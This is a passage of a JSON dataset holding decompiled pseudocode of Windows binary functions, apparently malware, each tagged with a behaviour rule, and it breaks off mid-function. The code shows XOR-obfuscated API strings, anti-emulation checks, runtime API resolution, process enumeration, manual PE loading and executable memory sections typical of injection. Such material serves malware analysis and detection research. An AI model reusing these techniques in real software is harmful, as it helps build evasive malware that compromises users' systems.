        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.004036c3(uint arg_8h, uint arg_ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    code *pcVar5;\n    uint uVar6;\n    int32_t iVar7;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t lpModuleName;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_24h = 0x342e153f;\n    var_20h = 0xd357a39;\n    var_1ch._0_2_ = 0x5826;\n    var_18h = 0x584a6151;\n    var_14h._0_2_ = 0x5455;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    var_4h = 6;\n    iVar7 = 0;\n    var_8h = &var_24h - iVar2;\n    lpModuleName = iVar2;\n    do {\n        iVar3 = (*_sym.imp.USER32.dll_GetClipboardViewer)();\n        if (iVar3 != 0x4733ae) {\n            *(iVar7 + iVar2) = *(&var_18h + iVar7 % var_4h) ^ (iVar7 + iVar2)[var_8h];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 10);\n    var_28h = 0x1f773b6a;\n    var_24h = 0x3e605a54;\n    var_20h = 0x47540c57;\n    var_1ch._0_2_ = 0x4c43;\n    var_18h = 0x6f384c30;\n    var_14h._0_2_ = 0x3431;\n    uVar1 = (*pcVar5)(8, 0xf);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    iVar7 = 0;\n    var_8h = &var_28h - iVar2;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_ReleaseCapture)();\n        iVar3 = lpModuleName;\n        if (iVar4 != 0x3476c7) {\n            *(iVar7 + iVar2) = *(&var_18h + iVar7 % var_4h) ^ (iVar7 + iVar2)[&var_28h - iVar2];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0xe);\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(lpModuleName);\n    pcVar5 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1, iVar2);\n    uVar1 = (*pcVar5)(var_10h, 0x1f0fff, arg_8h, arg_ch);\n    uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n    pcVar5 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar6);\n    uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n    (*pcVar5)(uVar6);\n    return uVar1;\n}\n",
        "token_count": 842
    },
    "00403c4c": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.00403c4c(code *param_1, uint param_2)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t *piVar7;\n    uint uVar8;\n    uint uVar9;\n    int32_t iVar10;\n    int32_t *piVar11;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    code *var_1ch;\n    uint var_18h;\n    int32_t *lpLibFileName;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    int32_t dwSize;\n    \n    var_8h = 0xffffffff;\n    iVar10 = 0;\n    var_10h = 5;\n    var_1ch = param_1;\n    var_18h = param_2;\n    if (*0x41db10 == NULL) {\n        var_30h = 0x342e153f;\n        var_2ch = 0xd357a39;\n        var_28h._0_2_ = 0x5826;\n        var_24h = 0x584a6151;\n        var_20h._0_2_ = 0x5455;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n        iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        lpLibFileName = iVar4;\n        do {\n            iVar5 = (*_sym.imp.USER32.dll_GetClipboardViewer)();\n            if (iVar5 != 0x4733ae) {\n                var_ch = 6;\n                *(iVar10 + iVar4) = *(&var_24h + iVar10 % 6) ^ (iVar10 + iVar4)[&var_30h - iVar4];\n            }\n            iVar10 = iVar10 + 1;\n        } while (iVar10 < 10);\n        var_4ch = 0x20033817;\n        var_48h = 0x1352b0f;\n        var_44h = 0x292d192c;\n        var_40h = 0x3f041c3f;\n        var_3ch = 0xb382023;\n        var_38h = 0x3b3d252d;\n        var_34h._0_1_ = 0x6a;\n        var_24h = 0x55524c59;\n        var_20h._0_2_ = CONCAT11(var_20h._1_1_, 0x6a);\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1a);\n        iVar10 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        iVar4 = 0;\n        var_ch = &var_4ch - iVar10;\n        do {\n            iVar6 = (*_sym.imp.USER32.dll_GetMessageExtraInfo)();\n            iVar5 = lpLibFileName;\n            if (iVar6 != 0xab03f0) {\n                *(iVar4 + iVar10) = *(&var_24h + iVar4 % var_10h) ^ (iVar4 + iVar10)[&var_4ch - iVar10];\n            }\n            iVar4 = iVar4 + 1;\n        } while (iVar4 < 0x19);\n        uVar3 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(lpLibFileName, iVar10);\n        *0x41db10 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar3);\n        pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar10);\n        pcVar1 = _sym.imp.KERNEL32.dll_HeapFree;\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n        uVar3 = (*pcVar2)(0, iVar5);\n        (*pcVar1)(uVar3);\n    }\n    dwSize = 0;\n    iVar10 = (**0x41db10)(5, 0, 0, &dwSize);\n    if (iVar10 == -0x3ffffffc) {\n        dwSize = dwSize + 0x100;\n        piVar7 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, dwSize, 0x3000, 4);\n        if (piVar7 != NULL) {\n            lpLibFileName = piVar7;\n            iVar10 = (**0x41db10)(5, piVar7, dwSize, 0);\n            uVar3 = var_18h;\n            if (-1 < iVar10) {\n                var_8h = 0;\n                piVar11 = piVar7;\n                do {\n                    iVar10 = piVar11[0x11];\n                    if (((iVar10 != 0) && (iVar10 != 4)) && (iVar10 != *0x41dab4)) {\n                        uVar8 = fcn.0040278e();\n                        uVar9 = fcn.00402046();\n                        iVar10 = (*var_1ch)(piVar11[0xf], uVar9, piVar11[0x11], piVar11[0x12], uVar8, uVar3);\n                        piVar7 = lpLibFileName;\n                        if (iVar10 == 0) break;\n                    }\n                    piVar7 = lpLibFileName;\n                    if (*piVar11 == 0) break;\n                    piVar11 = piVar11 + *piVar11;\n                } while( true );\n            }\n            (*_sym.imp.KERNEL32.dll_VirtualFree)(piVar7, 0, 0x8000);\n        }\n    }\n    return var_8h;\n}\n",
        "token_count": 1381
    },
    "00405b1a": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.00405b1a(uint param_1, uint param_2)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    code *pcVar5;\n    uint uVar6;\n    int32_t iVar7;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t lpLibFileName;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_28h = 0x342e153f;\n    var_24h = 0xd357a39;\n    var_20h._0_2_ = 0x5826;\n    var_1ch = 0x584a6151;\n    var_18h._0_2_ = 0x5455;\n    var_14h = param_2;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    iVar7 = 0;\n    var_ch = &var_28h - iVar2;\n    lpLibFileName = iVar2;\n    do {\n        iVar3 = (*_sym.imp.USER32.dll_GetClipboardViewer)();\n        if (iVar3 != 0x4733ae) {\n            var_8h = 6;\n            *(iVar7 + iVar2) = *(&var_1ch + iVar7 % 6) ^ (iVar7 + iVar2)[var_ch];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 10);\n    var_40h = 0x18611f22;\n    var_3ch = 0x621b0d27;\n    var_38h = 0x241b2f1f;\n    var_34h = 0xf2f2552;\n    var_30h = 0x24195d1f;\n    var_2ch._0_1_ = 0x6c;\n    var_8h = 0x76346b6c;\n    var_4h._0_1_ = 0x4a;\n    uVar1 = (*pcVar5)(8, 0x16);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    iVar7 = 0;\n    var_ch = &var_40h - iVar2;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_GetDoubleClickTime)();\n        iVar3 = lpLibFileName;\n        if (iVar4 != 0xb04526) {\n            var_ch = 5;\n            *(iVar7 + iVar2) = *(&var_8h + iVar7 % 5) ^ (iVar7 + iVar2)[&var_40h - iVar2];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0x15);\n    uVar1 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(lpLibFileName, iVar2);\n    pcVar5 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1);\n    (*pcVar5)(0xffffffff, var_14h);\n    uVar1 = fcn.00405d7e();\n    uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n    pcVar5 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar6);\n    uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n    (*pcVar5)(uVar6);\n    return uVar1;\n}\n",
        "token_count": 917
    },
    "00405c5a": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.00405c5a(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    code *pcVar5;\n    uint uVar6;\n    int32_t iVar7;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t lpModuleName;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_28h = 0x342e153f;\n    var_24h = 0xd357a39;\n    var_20h._0_2_ = 0x5826;\n    var_1ch = 0x584a6151;\n    var_18h._0_2_ = 0x5455;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    iVar7 = 0;\n    var_ch = &var_28h - iVar2;\n    lpModuleName = iVar2;\n    do {\n        iVar3 = (*_sym.imp.USER32.dll_GetClipboardViewer)();\n        if (iVar3 != 0x4733ae) {\n            var_8h = 6;\n            *(iVar7 + iVar2) = *(&var_1ch + iVar7 % 6) ^ (iVar7 + iVar2)[var_ch];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 10);\n    var_28h = 0x2b2a3e18;\n    var_24h = 0x292e2456;\n    var_20h._0_2_ = 0x3714;\n    var_8h = 0x79464a4a;\n    var_4h._0_1_ = 0x37;\n    uVar1 = (*pcVar5)(8, 0xb);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    iVar7 = 0;\n    var_ch = &var_28h - iVar2;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_GetMessagePos)();\n        iVar3 = lpModuleName;\n        if (iVar4 != 0xf7f2a) {\n            var_ch = 5;\n            *(iVar7 + iVar2) = *(&var_8h + iVar7 % 5) ^ (iVar7 + iVar2)[&var_28h - iVar2];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 10);\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(lpModuleName, iVar2);\n    pcVar5 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1);\n    uVar1 = (*pcVar5)(var_14h);\n    uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n    pcVar5 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar6);\n    uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n    (*pcVar5)(uVar6);\n    return uVar1;\n}\n",
        "token_count": 794
    },
    "00405d7e": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.00405d7e(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    code *pcVar5;\n    uint uVar6;\n    int32_t iVar7;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t lpModuleName;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_24h = 0x342e153f;\n    var_20h = 0xd357a39;\n    var_1ch._0_2_ = 0x5826;\n    var_18h = 0x584a6151;\n    var_14h._0_2_ = 0x5455;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    var_4h = 6;\n    iVar7 = 0;\n    var_8h = &var_24h - iVar2;\n    lpModuleName = iVar2;\n    do {\n        iVar3 = (*_sym.imp.USER32.dll_GetClipboardViewer)();\n        if (iVar3 != 0x4733ae) {\n            *(iVar7 + iVar2) = *(&var_18h + iVar7 % var_4h) ^ (iVar7 + iVar2)[var_8h];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 10);\n    var_3ch = 0xf5a3810;\n    var_38h = 0x2d36350d;\n    var_34h = 0x320a3442;\n    var_30h = 0x3259082d;\n    var_2ch = 0x2330143c;\n    var_28h._0_2_ = 0x4144;\n    var_18h = 0x41364c42;\n    var_14h._0_2_ = 0x6679;\n    uVar1 = (*pcVar5)(8, 0x17);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    iVar7 = 0;\n    var_8h = &var_3ch - iVar2;\n    do {\n        iVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n        iVar3 = lpModuleName;\n        if (iVar4 != 0xcec29d) {\n            *(iVar7 + iVar2) = *(&var_18h + iVar7 % var_4h) ^ (iVar7 + iVar2)[&var_3ch - iVar2];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0x16);\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(lpModuleName, iVar2);\n    pcVar5 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1);\n    uVar1 = (*pcVar5)(var_10h);\n    uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n    pcVar5 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar6);\n    uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n    (*pcVar5)(uVar6);\n    return uVar1;\n}\n",
        "token_count": 879
    },
    "00405eb2": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00405eb2(uint arg_8h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    code *pcVar4;\n    uint uVar5;\n    int32_t iVar6;\n    uint in_EDX;\n    int32_t iVar7;\n    uint *puVar8;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    pcVar4 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_10h = 0;\n    puVar8 = &var_28h;\n    for (iVar6 = 8; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    var_3ch = 0x9292020;\n    var_38h = 0x31073b32;\n    var_34h = 0x3e242713;\n    var_30h = 0x110370b;\n    var_2ch._0_2_ = 0x32d;\n    var_2ch._2_1_ = 0x6e;\n    var_20h = 0x6864546e;\n    var_1ch._0_2_ = 0x6d42;\n    var_14h = in_EDX;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x14);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    var_4h = 6;\n    iVar7 = 0;\n    var_8h = &var_3ch - iVar6;\n    var_ch = iVar6;\n    do {\n        iVar2 = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n        if (iVar2 != 0x9850c5) {\n            *(iVar7 + iVar6) = *(&var_20h + iVar7 % var_4h) ^ (iVar7 + iVar6)[var_8h];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0x13);\n    var_34h = 0x342e153f;\n    var_30h = 0xd357a39;\n    var_2ch._0_2_ = 0x5826;\n    var_20h = 0x584a6151;\n    var_1ch._0_2_ = 0x5455;\n    uVar1 = (*pcVar4)(8, 0xb);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    iVar7 = 0;\n    var_8h = &var_34h - iVar6;\n    do {\n        iVar3 = (*_sym.imp.USER32.dll_GetClipboardViewer)();\n        iVar2 = var_ch;\n        if (iVar3 != 0x4733ae) {\n            *(iVar7 + iVar6) = *(&var_20h + iVar7 % var_4h) ^ (iVar7 + iVar6)[&var_34h - iVar6];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 10);\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(iVar6, var_ch);\n    pcVar4 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1);\n    (*pcVar4)(var_18h, var_14h, arg_8h, 0, 0, &var_28h, &var_10h, 2, 0, 0x40);\n    uVar1 = fcn.00405d7e();\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar6);\n    pcVar4 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n    (*pcVar4)(uVar5);\n    return uVar1;\n}\n",
        "token_count": 1018
    },
    "00406012": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00406012(uchar *arg_8h)\n\n{\n    uint32_t *puVar1;\n    uint16_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    uchar *in_ECX;\n    int32_t iVar9;\n    uint32_t uVar10;\n    int32_t *piVar11;\n    uchar *in_EDX;\n    int32_t *piVar12;\n    uchar *puVar13;\n    uchar *puVar14;\n    uint32_t uVar15;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar3 = *(in_EDX + 0x3c);\n    uVar2 = *(in_EDX + iVar3 + 0x14);\n    iVar7 = *(in_EDX + iVar3 + 0x3c);\n    uVar6 = *(in_EDX + iVar3 + 6);\n    puVar13 = in_EDX;\n    puVar14 = in_ECX;\n    for (iVar9 = *(in_EDX + iVar3 + 0x54); iVar9 != 0; iVar9 = iVar9 + -1) {\n        *puVar14 = *puVar13;\n        puVar13 = puVar13 + 1;\n        puVar14 = puVar14 + 1;\n    }\n    if (uVar6 != 0) {\n        piVar12 = in_EDX + uVar2 + 0x2c + iVar3;\n        do {\n            uVar10 = iVar7 + -1 + piVar12[-1] & ~(iVar7 - 1U);\n            if (uVar10 != 0) {\n                puVar13 = in_EDX + *piVar12;\n                puVar14 = in_ECX + piVar12[-2];\n                for (; uVar10 != 0; uVar10 = uVar10 - 1) {\n                    *puVar14 = *puVar13;\n                    puVar13 = puVar13 + 1;\n                    puVar14 = puVar14 + 1;\n                }\n            }\n            piVar12 = piVar12 + 10;\n            uVar6 = uVar6 - 1;\n        } while (uVar6 != 0);\n    }\n    puVar13 = in_ECX;\n    if (arg_8h != NULL) {\n        puVar13 = arg_8h;\n    }\n    iVar7 = 0xa0;\n    if (*(in_EDX + iVar3 + 4) == -0x799c) {\n        iVar7 = 0xb0;\n    }\n    if ((*(in_EDX + iVar7 + iVar3) != 0) && (uVar6 = *(in_EDX + iVar7 + 4 + iVar3),  uVar6 != 0)) {\n        if (*(in_EDX + iVar3 + 4) == -0x799c) {\n            iVar9 = *(in_EDX + iVar3 + 0x30);\n        }\n        else {\n            iVar9 = *(in_EDX + iVar3 + 0x34);\n        }\n        puVar14 = *(in_EDX + iVar3 + 0x30);\n        uVar10 = puVar13 - *(in_EDX + iVar3 + 0x30);\n        iVar4 = *(in_EDX + iVar3 + 0x34);\n        piVar12 = in_ECX + *(in_EDX + iVar7 + iVar3);\n        for (; 8 < uVar6; uVar6 = uVar6 - *piVar11) {\n            iVar3 = *piVar12;\n            uVar15 = piVar12[1] - 8U >> 1;\n            if ((piVar12[1] <= uVar6) && (uVar15 != 0)) {\n                piVar11 = piVar12 + 2;\n                do {\n                    uVar2 = *piVar11;\n                    if (uVar2 >> 0xc == 3) {\n                        *(in_ECX + (uVar2 & 0xfff) + iVar3) = puVar13 + (*(in_ECX + (uVar2 & 0xfff) + iVar3) - iVar9);\n                    }\n                    else if (uVar2 >> 0xc == 10) {\n                        uVar8 = uVar2 & 0xfff;\n                        puVar1 = in_ECX + uVar8 + iVar3;\n                        uVar5 = *puVar1;\n                        *puVar1 = *puVar1 + uVar10;\n                        *(in_ECX + uVar8 + 4 + iVar3) =\n                             *(in_ECX + uVar8 + 4 + iVar3) + (((puVar13 >> 0x1f) - iVar4) - (puVar13 < puVar14)) +\n                             CARRY4(uVar5, uVar10);\n                    }\n                    piVar11 = piVar11 + 2;\n                    uVar15 = uVar15 - 1;\n                } while (uVar15 != 0);\n            }\n            piVar11 = piVar12 + 1;\n            piVar12 = piVar12 + piVar12[1];\n        }\n    }\n    return 0;\n}\n",
        "token_count": 1189
    },
    "0040616d": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.0040616d(int32_t *arg_8h)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    code *pcVar4;\n    int32_t iVar5;\n    uint *in_EDX;\n    int32_t iVar6;\n    uint *puVar7;\n    uchar *puVar8;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    int32_t var_2ch;\n    uint var_24h;\n    uint var_20h;\n    uint *var_1ch;\n    int32_t var_18h;\n    int32_t lpModuleName;\n    int32_t var_10h;\n    uchar *var_ch;\n    int32_t var_8h;\n    \n    var_8h = 0;\n    var_ch = NULL;\n    var_38h = 0x342e153f;\n    puVar7 = &var_54h;\n    var_1ch = in_EDX;\n    for (iVar5 = 0x18; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    var_34h = 0xd357a39;\n    puVar7 = &var_2ch;\n    for (iVar5 = 8; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    puVar7 = &var_24h;\n    for (iVar5 = 8; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    var_30h = CONCAT22(var_30h._2_2_, 0x5826);\n    var_24h = 0x584a6151;\n    var_20h._0_2_ = 0x5455;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n    iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    var_10h = 6;\n    iVar6 = 0;\n    lpModuleName = iVar5;\n    do {\n        iVar3 = (*_sym.imp.USER32.dll_GetClipboardViewer)();\n        if (iVar3 != 0x4733ae) {\n            *(iVar6 + iVar5) = *(&var_24h + iVar6 % var_10h) ^ (iVar6 + iVar5)[&var_38h - iVar5];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 10);\n    var_3ch = 0x220d1f09;\n    var_38h = 0xe332221;\n    var_34h = 0x3727351d;\n    var_30h = 0x5020042e;\n    var_24h = 0x504e6b47;\n    var_20h._0_2_ = 0x4344;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x11);\n    iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar6 = 0;\n    var_18h = &var_3ch - iVar5;\n    do {\n        iVar3 = (*_sym.imp.USER32.dll_GetForegroundWindow)();\n        if (iVar3 != 0xc5ae66) {\n            *(iVar6 + iVar5) = *(&var_24h + iVar6 % var_10h) ^ (iVar6 + iVar5)[&var_3ch - iVar5];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 0x10);\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(lpModuleName, iVar5);\n    pcVar4 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2);\n    var_48h = 0x40;\n    var_54h = 0x18;\n    var_50h = 0;\n    var_4ch = 0;\n    var_44h = 0;\n    var_40h = 0;\n    iVar6 = (*pcVar4)(&var_8h, 0xf001f, &var_54h, &var_2ch, 0x40, 0x8000000, 0);\n    if (iVar6 < 0) {\n        iVar6 = fcn.00405d7e();\n    }\n    else {\n        iVar6 = fcn.00405eb2(&var_ch);\n        puVar8 = var_ch;\n        var_10h = iVar6;\n        if (iVar6 == 0) {\n            for (; var_2ch != 0; var_2ch = var_2ch + -1) {\n                *puVar8 = 0;\n                puVar8 = puVar8 + 1;\n            }\n            *var_1ch = var_ch;\n            if (arg_8h != NULL) {\n                *arg_8h = var_8h;\n            }\n        }\n    }\n    if ((var_8h != 0) && (arg_8h == NULL)) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(var_8h);\n    }\n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar5);\n    pcVar4 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    uVar2 = (*pcVar1)(0, lpModuleName);\n    (*pcVar4)(uVar2);\n    return iVar6;\n}\n",
        "token_count": 1382
    },
    "0040678e": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.0040678e(void)\n\n{\n    int16_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int16_t *piVar4;\n    int32_t iVar5;\n    int16_t *piVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    code *pcVar9;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar3 = *0x41daac;\n    iVar7 = 0;\n    var_4h = 0;\n    var_8h = 0;\n    var_18h = 0;\n    iVar2 = fcn.004068be(&var_8h);\n    if (iVar2 != 0) {\n        iVar2 = (*_sym.imp.SHLWAPI.dll_StrDupW)(uVar3);\n        var_14h = iVar2;\n        var_10h = fcn.00409bd3();\n        pcVar9 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        if (var_10h != 0) {\n            var_2ch = 0x3930747a;\n            var_28h = 0x59125423;\n            var_24h._0_2_ = 0x4d39;\n            var_20h = 0x39597454;\n            var_1ch._0_1_ = 0x4d;\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x15);\n            piVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n            iVar8 = iVar7;\n            do {\n                iVar5 = (*_sym.imp.KERNEL32.dll_GetCommandLineA)();\n                iVar2 = var_14h;\n                iVar7 = var_18h;\n                if (iVar5 != 0xdd759a) {\n                    var_ch = 5;\n                    